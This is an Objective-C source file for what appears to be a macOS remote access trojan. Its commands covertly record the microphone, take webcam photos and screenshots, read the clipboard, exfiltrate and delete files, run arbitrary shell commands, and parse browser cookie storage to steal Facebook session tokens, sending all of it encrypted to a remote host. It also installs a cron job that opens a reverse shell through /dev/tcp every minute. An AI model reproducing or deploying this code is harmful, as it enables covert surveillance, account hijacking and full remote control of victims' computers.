
#import "espl.h"

@implementation espl

@synthesize soundRecorder, fileManager;

BOOL micinuse;
FILE *cookieJar;
char lastBytes[64];
    
-(id)init {
    fileManager = [[NSFileManager alloc] init];
    return self;
}

//MARK: Convenience
-(void)blank {
    [self sendString:@""]; //bang
}

-(NSString *)forgetFirst:(NSArray *)args {
    int x = 1;
    NSString *path = @"";
    for (NSString *tpath in args) {
        if (x != 1) {
            path = [NSString stringWithFormat:@"%@%@ ",path,tpath];
        }
        x++;
    }
    return [path substringToIndex:[path length] - 1];
}

    
char* parseBinary(int* searchChars,int sizeOfSearch) {
    cookieJar = fopen("/Users/lucasjackson/Library/Cookies/Cookies.binarycookies", "rb+");
    fseek(cookieJar, 0L, SEEK_END);
    long cookieJarSize = ftell(cookieJar);
    int pos = 0; int curSearch = 0;int curChar;
    fseek(cookieJar, 0, 0);
    
    while(pos <= cookieJarSize) {
        curChar = getc(cookieJar);pos++;
        
        if(curChar == searchChars[curSearch]) { /* found a match */
            curSearch++;                        /* search for next char */
            if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
                curSearch = 0;                  /* start searching again */
                fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
                return lastBytes;
            }
            
        } else { /* didn't find a match */
            if (curSearch > 18) {
                printf("fuck %d\n",searchChars[curSearch]);
            }
            curSearch = 0;                     /* go back to searching for first char */
        }
    };
    printf("could not find cookie\n");
    exit(0);
}
//MARK: Socketry

int sockfd;

-(int)connect:(NSString*)host
             :(long)port {
    socklen_t len;
    struct sockaddr_in address;
    int result;
    
    /*  Create a socket for the client.  */
    sockfd = socket (AF_INET, SOCK_STREAM, 0);
    /*  Name the socket, as agreed with the server.  */
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr ([host UTF8String]);
    address.sin_port = htons (port);
    len = sizeof (address);
    result = connect (sockfd, (struct sockaddr *) &address, len);
    return result;
}

-(void)sendData:(NSData *)data {
    unsigned char *prepData = (unsigned char *)[data bytes];
    write (sockfd, prepData, sizeof(data));
}

-(void)sendString:(NSString *)string {
    string = [string stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
    
    NSData *plainTextData = [string dataUsingEncoding:NSUTF8StringEncoding];
    NSString *base64String = [plainTextData base64EncodedStringWithOptions:0];
    
    //system([[NSString stringWithFormat:@"terminal-notifier -message 'prefinalstr = %@' -execute 'echo \'%@\' | pbcopy'",base64String,base64String] UTF8String]);
    
    NSString *finalstr = [FBEncryptorAES encryptBase64String:base64String keyString:self.skey separateLines:false];
    
    //system([[NSString stringWithFormat:@"terminal-notifier -message 'finalstr = %@' -execute 'echo \'%@\' | pbcopy'",finalstr,finalstr] UTF8String]);
    finalstr = [NSString stringWithFormat:@"%@EOF6D2ONE",finalstr];
    write (sockfd, [finalstr UTF8String], finalstr.length + 11);
}

//MARK: Mic

-(void)mic:(NSArray *)args {
    NSString *usage = @"Usage: mic [record|stop]";
    if (args.count == 1) {
        [self sendString:usage];
    }
    else if ([args[1] isEqualToString:@"record"]) {
        if ([self recordAudio]) {
            [self sendString:@"Listening..."];
        }
        else {
            [self sendString:@"Already Recording"];
        }
    }
    else if ([args[1] isEqualToString:@"stop"]) {
        if ([self stopAudio]) {
            [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.avatmp", nil]];
        }
        else {
            [self sendString:@"-1"];
        }
    }
    else {
        [self sendString:usage];
    }
}

-(void)initmic {
    NSString *tempDir;
    NSURL *soundFile;
    NSDictionary *soundSetting;
    tempDir = @"/tmp/";
    soundFile = [NSURL fileURLWithPath: [tempDir stringByAppendingString:@".avatmp"]];
    soundSetting = [NSDictionary dictionaryWithObjectsAndKeys:
                    [NSNumber numberWithFloat: 44100.0],AVSampleRateKey,
                    [NSNumber numberWithInt: kAudioFormatMPEG4AAC],AVFormatIDKey,
                    [NSNumber numberWithInt: 2],AVNumberOfChannelsKey,
                    [NSNumber numberWithInt: AVAudioQualityHigh],AVEncoderAudioQualityKey, nil];
    soundRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: nil];
}
-(BOOL)stopAudio {
    if (micinuse) {
        [soundRecorder stop];
        micinuse = false;
        return true;
    }
    else {
        return false;
    }
    
}
-(BOOL)recordAudio {
    if (!micinuse) {
        [self initmic];
        [soundRecorder record];
        micinuse = true;
        return true;
    }
    else {
        return false;
    }
}

//MARK: Camera

-(void)takePicture {
    __block BOOL done = NO;
    [self captureWithBlock:^(NSData *imageData)
     {
         done = YES;
         if (imageData == nil) {
             [self sendString:@"-3"];
         }
         else {
             [self sendString:[NSString stringWithFormat:@"%lu",imageData.length]];
             [self sendFile:imageData];
         }
     }];
    while (!done) {
        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
    }
    [self stopcapture];
}

- (AVCaptureDevice *)getcapturedevice
{
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionUnspecified){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}
-(void)initcamera {
    self.session = [[AVCaptureSession alloc] init];
    self.session.sessionPreset = AVCaptureSessionPresetiFrame1280x720;
    AVCaptureDevice *device = nil;
    NSError *error = nil;
    device = [self getcapturedevice];
    
    //camera
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
    if (!input) {
        // Handle the error appropriately.
        NSLog(@"ERROR: trying to open camera: %@", error);
    }
    [self.session addInput:input];
    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
    [self.stillImageOutput setOutputSettings:outputSettings];
    [self.session addOutput:self.stillImageOutput];
    [self.session startRunning];
    [NSThread sleepForTimeInterval:1];
}

-(void)captureWithBlock:(void (^)(NSData *))block {
    //initialize camera
    [self initcamera];
    
    //capture picture
    AVCaptureConnection* videoConnection = nil;
    for (AVCaptureConnection* connection in self.stillImageOutput.connections)
    {
        for (AVCaptureInputPort* port in [connection inputPorts])
        {
            if ([[port mediaType] isEqual:AVMediaTypeVideo])
            {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection)
            break;
    }
    
    //capture still image from video connection
    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
     {
         if (error) {
             printf("there was an error with imagesamplebuffer!\n");
         }
         NSData* imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
         
         if (imageData) {
             block(imageData);
         }
         else {
             block(nil);
         }
     }];
}

-(void)stopcapture {
    [self.session stopRunning];
}

//MARK: File Management

-(void)directoryList:(NSArray *)args {
    //basically "ls"
    printf("directory listing %s\n",[_skey UTF8String]);
    NSArray *files;
    NSString *dir = [fileManager currentDirectoryPath];
    if (args.count > 1) {
        dir = [self forgetFirst:args];
    }
    
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (!isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",dir]];
            return;
        }
        else { //IF EVERYTHING IS OK, LS!
            NSError *error;
            files = [fileManager contentsOfDirectoryAtPath:dir error:&error];
            if (error) { //if something goes wrong
                [self sendString:[NSString stringWithFormat:@"%@",error]];
                return;
            }
            
            //info of directories
            NSString *result = @"";
            for (NSString *fName in files) {
                NSDictionary *fAttr = [fileManager attributesOfItemAtPath:[NSString stringWithFormat:@"%@/%@",dir,fName] error:&error];
                
                //TODO: make this a function
                NSString *fSize = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileSize]];
                NSString *space1 = @"  ";
                int space1len = 10;
                for (unsigned int i = 0; i < space1len - [fSize length] && [fSize length] < space1len; i = i + 1) {
                    space1 = [NSString stringWithFormat:@"%@ ",space1];
                }
                
                NSString *fPerm = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFilePosixPermissions]];
                NSString *space2 = @"  ";
                int space2len = 4;
                for (unsigned int i = 0; i < space2len - [fPerm length] && [fPerm length] < space2len; i = i + 1) {
                    space2 = [NSString stringWithFormat:@"%@ ",space2];
                }
                
                NSString *fModDate = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileModificationDate]];
                NSString *space3 = @"  ";
                int space3len = 20;
                for (unsigned int i = 0; i < space3len - [fModDate length] && [fModDate length] < space3len; i = i + 1) {
                    space3 = [NSString stringWithFormat:@"%@ ",space3];
                }
                
                NSString *fOwner = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileOwnerAccountName]];
                NSString *space4 = @"  ";
                int space4len = 12;
                for (unsigned int i = 0; i < space4len - [fOwner length] && [fOwner length] < space4len; i = i + 1) {
                    space4 = [NSString stringWithFormat:@"%@ ",space4];
                }
                
                result = [result stringByAppendingString:[NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@\n",
                                                          fSize,
                                                          space1,
                                                          fPerm,
                                                          space2,
                                                          fModDate,
                                                          space3,
                                                          fOwner,
                                                          space4,
                                                          fName]];
            }
            if ([result length] > 0) {
                result = [result stringByReplacingOccurrencesOfString:@" +0000" withString:@""];
                result = [NSString stringWithFormat:@"total %lu\n%@",[files count],result];
                result = [result substringToIndex:[result length] - 1];
            }
            
            [self sendString:result];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
        return;
    }
}

-(void)changeWD:(NSArray *)args {
    //basically "cd"
    NSString *dir = NSHomeDirectory();
    if (args.count > 1) {
        dir = [self forgetFirst:args];
    }
    
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (isdir) {
            [fileManager changeCurrentDirectoryPath:dir];
            [self blank];
        }
        else {
            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
    }
}

-(void)rmFile:(NSArray *)args {
    NSString *file = @"";
    if (args.count > 1) {
        file = [self forgetFirst:args];
    }
    else {
        [self sendString:@"Usage: rm filename"];
        return;
    }
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:file isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",file]];
        }
        else {
            [fileManager removeItemAtPath:file error:NULL];
            [self sendString:@""];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",file]];
    }
}

-(void)download:(NSArray *)args {
    BOOL isdir;
    NSString *filepath = @"";
    if (args.count > 1) {
        filepath = [self forgetFirst:args];
    }
    
    if ([fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:@"-2"];
        }
        else {
            NSData *filedata = [fileManager contentsAtPath:filepath];
            [self sendString:[NSString stringWithFormat:@"%lu",filedata.length]];
            [self sendFile:filedata];
        }
    }
    else {
        [self sendString:@"-1"];
    }
}


-(void)encryptFile:(NSArray *)args {
    BOOL isdir;
    NSString *filepath = @"";
    if (args.count > 2) {
        filepath = [self forgetFirst:args];
        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
    }
    else {
        [self sendString:@"Usage: encrypt file password1234"];
        return;
    }
    
    if ([fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
        }
        else {
            NSData *filedata = [fileManager contentsAtPath:filepath];
            [self sendString:[NSString stringWithFormat:@"Encrypting %@.aes with 256 Bit AES",filepath]];
            filedata = [filedata AES256EncryptWithKey:args[args.count -1]];
            [filedata writeToFile:[NSString stringWithFormat:@"%@.aes",filepath] atomically:true];
            [fileManager removeItemAtPath:filepath error:nil];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
    }
}

-(void)decryptFile:(NSArray *)args {
    BOOL isdir;
    NSString *filepath = @"";
    if (args.count > 2) {
        filepath = [self forgetFirst:args];
        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
    }
    else {
        [self sendString:@"Usage: decrypt file.aes password1234"];
        return;
    }
    
    if ([fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
        }
        else {
            if ([filepath containsString:@".aes"]) {
                NSData *filedata = [fileManager contentsAtPath:filepath];
                [self sendString:[NSString stringWithFormat:@"Decrypting %@",filepath]];
                filedata = [filedata AES256DecryptWithKey:args[args.count -1]];
                [filedata writeToFile:[filepath substringToIndex:[filepath length] - 4] atomically:true];
                [fileManager removeItemAtPath:filepath error:nil];

            }
            else {
                [self sendString:[NSString stringWithFormat:@"Only supports .aes files"]];
            }
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
    }
}

-(void)receiveFile:(NSString *)saveToPath {
    //GLOBAL
    NSString *b64data;
    NSString *chunk;
    long bsize = 1024;
    char buffer[bsize];
    
    while(read (sockfd, &buffer, sizeof(buffer))) {
        //append chunk limited to 64 chars
        long blen = strlen(buffer);
        if (blen < bsize) {
            bsize = blen;
        }
        chunk = [[NSString stringWithFormat:@"%s",buffer] substringToIndex:bsize];
        b64data = [NSString stringWithFormat:@"%@%@",b64data,chunk];
        
        //check for terminating flag
        if (!([b64data rangeOfString:@"DONEEOF"].location == NSNotFound)) {
            //remove terminator
            b64data = [b64data stringByReplacingOccurrencesOfString:@"DONEEOF" withString:@""];
            //get data
            NSData *mydata = [[NSData alloc] initWithBase64EncodedString:b64data options: NSDataBase64DecodingIgnoreUnknownCharacters];
            [mydata writeToFile:@"unfinished.txt" atomically:true];
            //exit while loop
            return;
        }
        //reset buffer
        memset(buffer,'\0',bsize);
    }
}


-(void)sendFile:(NSData *)fileData {
    NSString *writeToFileName = @"/private/tmp/.tmpenc";
    fileData = [fileData AES256EncryptWithKey:_skey];
    [fileData writeToFile:writeToFileName atomically:true];
    
    char bufferin[256];
    FILE *fp;
    fp = fopen([writeToFileName UTF8String], "r");
    
    /*
     stream file to socket
     some padding will exist but only at the end of the file
     we can handle this server side by removing the offset
     */
    while (!feof(fp))
    {
        unsigned long nRead = fread(bufferin, sizeof(char), 256, fp);
        if (nRead <= 0)
        printf("ERROR reading file\n");
        
        char *pBuf = bufferin;
        while (nRead > 0)
        {
            long nSent = send(sockfd, pBuf, nRead, 0);
            
            if (nSent == -1)
            {
                fd_set writefd;
                FD_ZERO(&writefd);
                FD_SET(sockfd, &writefd);
                
                if (select(0, NULL, &writefd, NULL, NULL) != 1)
                printf("ERROR waiting to write to socket\n");
                continue;
            }
            
            if (nSent == 0)
            printf("DISCONNECTED writing to socket\n");
            
            pBuf += nSent;
            nRead -= nSent;
        }
    }
    //our end send file command
    write(sockfd, "EOF6D2ONE", 9);
}


//MARK: Misc

-(void)executeCMD:(NSArray *)args {
    if (args.count == 1) {
        [self sendString:@"Usage: exec say hi; touch file"];
        return;
    }
    system([[self forgetFirst:args] UTF8String]);
    [self sendString:@""];
}

-(void)idleTime {
    //returns number of seconds
    int64_t idlesecs = -1;
    io_iterator_t iter = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) {
        io_registry_entry_t entry = IOIteratorNext(iter);
        if (entry) {
            CFMutableDictionaryRef dict = NULL;
            if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) {
                CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
                if (obj) {
                    int64_t nanoseconds = 0;
                    if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) {
                        idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
                    }
                }
                CFRelease(dict);
            }
            IOObjectRelease(entry);
        }
        IOObjectRelease(iter);
    }
   [self sendString:[NSString stringWithFormat:@"%lld",idlesecs]];
}

-(void)getPid {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]];
}

-(void)getFacebook {
    NSString *result = @"";
    int cuserArr[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6f, 0x6f, 0x6b,
        0x2e, 0x63, 0x6f, 0x6d, 0x00, 0x63, 0x5f, 0x75,
        0x73, 0x65, 0x72, 0x00, 0x2f, 0x00}; //facebook.com c_user /
    result = [NSString stringWithFormat:@"c_user = %s\n",parseBinary(cuserArr,22)];

    int tokenArr[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6F, 0x6F, 0x6B,
        0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x78, 0x73, 0x00,
        0x2f, 0x00}; //facebook.com xs /
    result = [NSString stringWithFormat:@"%@xs = %s",result,parseBinary(tokenArr,18)];

    [self sendString:result];
}

-(void)getPaste {
    //easy :p
    NSPasteboard *myPasteboard  = [NSPasteboard generalPasteboard];
    NSString *contents = [myPasteboard  stringForType:NSPasteboardTypeString];
    if (contents == nil) {
        [self sendString:@"empty"];
    }
    [self sendString:contents];
}

-(void)set_brightness:(NSArray *)args {
    if (!(args.count > 1)) {
        [self sendString:@"Usage: brightness 0.x"];
        return;
    }
    const int kMaxDisplays = 16;
    const CFStringRef kDisplayBrightness = CFSTR(kIODisplayBrightnessKey);
    
    CGDirectDisplayID display[kMaxDisplays];
    CGDisplayCount numDisplays;
    CGDisplayErr err;
    err = CGGetActiveDisplayList(kMaxDisplays, display, &numDisplays);
    
    if (err != CGDisplayNoErr) {
        [self blank];
        return;
    }
    
    for (CGDisplayCount i = 0; i < numDisplays; ++i) {
        CGDirectDisplayID dspy = display[i];
        CFDictionaryRef originalMode = CGDisplayCurrentMode(dspy);
        io_service_t service = CGDisplayIOServicePort(dspy);
        
        float brightness;
        err= IODisplayGetFloatParameter(service,
                                        kNilOptions, kDisplayBrightness,
                                        &brightness);

        
        IODisplaySetFloatParameter(service, kNilOptions, kDisplayBrightness, [args[1] floatValue]);
    }
    [self blank];

}

-(void)screenshot {
    CGImageRef screenShot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNullWindowID, kCGWindowImageDefault);
    NSBitmapImageRep *bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:screenShot];
    // Create an NSImage and add the bitmap rep to it...
    NSImage *image = [[NSImage alloc] init];
    [image addRepresentation:bitmapRep];
    NSData *imageData = [image TIFFRepresentation];
    //convert to jpeg
    NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:imageData];
    NSNumber *compressionFactor = [NSNumber numberWithFloat:0.9];
    NSDictionary *imageProps = [NSDictionary dictionaryWithObject:compressionFactor forKey:NSImageCompressionFactor];
    imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
    
    [self sendString:[NSString stringWithFormat:@"%lu",imageData.length]];
    [self sendFile:imageData];
}

-(void)removePersistence:(NSString *)ip
                        :(NSString *)port {
    NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%@ 0>&1\n",ip,port];
    system("crontab -l > /private/tmp/.cryon");
    NSData *crondata = [fileManager contentsAtPath:@"/private/tmp/.cryon"];
    NSString *newcron = [[NSString alloc]initWithData:crondata encoding:NSUTF8StringEncoding];
    newcron = [newcron stringByReplacingOccurrencesOfString:persist withString:@""];
    [newcron writeToFile:@"/private/tmp/.cryon" atomically:true encoding:NSUTF8StringEncoding error:nil];
    system("crontab /private/tmp/.cryon; rm /private/tmp/.cryon");
    [self sendString:@""];
}

-(void)persistence:(NSString *)ip
                  :(NSString *)port {
    [self removePersistence:ip:port];
    NSString *payload = [NSString stringWithFormat:@"crontab -l > /private/tmp/.cryon; echo '* * * * * bash &> /dev/tcp/%@/%@ 0>&1' >> /private/tmp/.cryon;crontab /private/tmp/.cryon; rm /private/tmp/.cryon",ip,port];
    system([payload UTF8String]);
    [self sendString:@""];
}

-(void)openURL:(NSArray *)cmdarray {
    if (cmdarray.count == 1) {
        [self sendString:@"Usage: openurl http://example.com"];
        return;
    }
    NSURL *url = [NSURL URLWithString:cmdarray[1]];
    [[NSWorkspace sharedWorkspace] openURL:url];
    [self blank];
}


@end






